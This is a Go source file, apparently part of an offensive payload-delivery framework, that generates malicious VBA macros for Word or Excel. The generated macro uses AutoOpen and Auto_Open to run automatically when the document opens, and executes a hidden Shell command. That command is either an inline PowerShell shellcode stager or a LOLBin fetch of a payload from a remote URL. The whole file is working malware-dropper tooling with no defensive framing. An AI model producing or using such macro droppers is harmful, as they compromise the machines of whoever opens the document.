// vba.go — emit a VBA macro (.vba) suitable for pasting into a Word/Excel macro
// module. AutoOpen fires on document open (macros enabled). The macro runs the
// inline powershell stager (inline mode) or a LOLBin fetch (remote mode) via
// `Shell`. vbHide keeps the window hidden.
package delivery

import "strings"

type vbaEmitter struct{}

func (vbaEmitter) Name() string { return "vba" }
func (vbaEmitter) Ext() string  { return "vba" }

func (vbaEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("vba")
	}
	body := vbaBody(cmd)
	return []Artifact{writeFile("payload.vba", []byte(body))}, nil
}

// vbaBody renders an AutoOpen macro that Shell-runs `cmd` hidden.
func vbaBody(cmd string) string {
	var b strings.Builder
	b.WriteString("' AutoOpen — pasted into a Word/Excel VBA module. Enable macros.\n")
	b.WriteString("Sub AutoOpen()\n")
	b.WriteString("  Shell \"" + vbaEscape(cmd) + "\", vbHide\n")
	b.WriteString("End Sub\n")
	b.WriteString("Sub Auto_Open()\n")
	b.WriteString("  AutoOpen\n")
	b.WriteString("End Sub\n")
	return b.String()
}